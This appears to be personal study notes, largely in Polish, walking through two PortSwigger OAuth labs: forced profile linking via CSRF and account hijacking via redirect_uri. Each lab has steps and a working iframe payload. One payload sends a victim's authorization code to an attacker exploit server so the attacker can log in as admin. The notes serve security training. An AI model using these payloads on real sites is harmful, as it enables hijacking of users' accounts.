Lab: Forced OAuth profile linking (code token nie ma csrf protect)

1. Zaloguj sie w klasyczny sposob bez social mediów
2. My account: Zacznij linkowanie konta OAuth    peter.wiener:hotdog
3. Przechwyć request z kodem OAuth (code=...) GET /oauth-linking?code=6EIugu6
4. Zatrzymaj przed finalizacją > skopiuj kod > DROP request
5. Zbuduj exploit który zmusza ofiarę do użycia Twojego kodu > Store > Deliver > Logout > Login with SM
6. Ofiara linkuje Twoje konto OAuth do swojego konta
7. Logujesz się przez OAuth jako ofiara


payload
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>



<hr><hr>


Lab: OAuth account hijacking via redirect_uri*<br>

Zaloguj się jako wiener i przejdź wszystkie kroki> odpal ostatni request OAuth /auth?client_id=... w Burp<br>

Na exploit serverze wklej iframe z redirect_uri wskazującym na exploit server<br>

Kliknij Store → Deliver exploit to victim<br>

W logach exploit servera znajdź ?code=... od ofiary<br>

Wyloguj się z wiener<br>

Wejdź na /oauth-callback?code=KOD_OFIARY<br>

Jesteś zalogowany jako admin/carlos<br>


<br>
payload
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
<br>




Log out, and navigate to the following URL, where you’ll be met with the Admin Panel:



https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=CODE

<img width="1456" height="1048" alt="image" src="https://github.com/user-attachments/assets/595f7290-2773-4b6f-b82e-bb64aebe4d32" />
